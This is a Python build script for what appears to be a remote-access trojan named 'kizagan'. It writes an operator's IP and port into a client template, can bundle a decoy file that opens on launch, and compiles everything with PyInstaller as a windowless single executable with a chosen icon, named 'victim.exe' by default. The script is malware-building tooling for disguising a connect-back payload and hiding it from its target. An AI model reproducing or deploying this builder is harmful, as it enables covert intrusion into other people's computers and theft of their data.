import PyInstaller.__main__
import os
from shutil import copyfile, rmtree


def build(ip, port, icon_file, merge_file, name):
    if merge_file != None:
        code = f"""
open_merge_file({merge_file})
ip = '{ip}'
port = {port}
try_connection()
"""
    else:
        code = f"""
ip = '{ip}'
port = {port}
try_connection()
"""
    if os.name == "nt":
        build_file = open("module\\kizagan_client_build.py", "r")
    else:
        build_file = open("module/kizagan_client_build.py", "r")
    build_file_content = build_file.read()
    build_file.close()
    code = build_file_content + code
    building_file = open("kizagan_client_building.py", "w")
    building_file.write(code)
    building_file.close()
    if merge_file != None:
        merge_command = f"{merge_file};."
    else:
        merge_command = None
    if merge_command != None and icon_file != None:
        PyInstaller.__main__.run([
            "kizagan_client_building.py",
            "--onefile",
            "--noconsole",
            "--icon",
            icon_file,
            "--add-data",
            merge_command
])
    elif icon_file != None:
        PyInstaller.__main__.run([
            "kizagan_client_building.py",
            "--onefile",
            "--noconsole",
            "--icon",
            icon_file
])
    elif merge_command != None:
        PyInstaller.__main__.run([
            "kizagan_client_building.py",
            "--onefile",
            "--noconsole",
            "--add-data",
            merge_command
])
    else:
        PyInstaller.__main__.run([
            "kizagan_client_building.py",
            "--onefile",
            "--noconsole"
])
    if name == None:
        if os.name == "nt":
            name = "victim.exe"
        else:
            name = "victim"
    elif 2 > len(name.split(".")):
        if os.name == "nt":
            name = name + ".exe"
    if os.name == "nt":
        copyfile("dist\\kizagan_client_building.exe", f"output\\{name}")
    else:
        copyfile(f"dist/kizagan_client_building", f"output/{name}")
    os.remove("kizagan_client_building.py")
    os.remove("kizagan_client_building.spec")
    rmtree("dist")
    rmtree("build")
    if os.name == "nt":
        print(f"[+]Build completed.Executable file located: output\\{name}")
    else:
        print(f"[+]Build completed.Executable file located: output/{name}")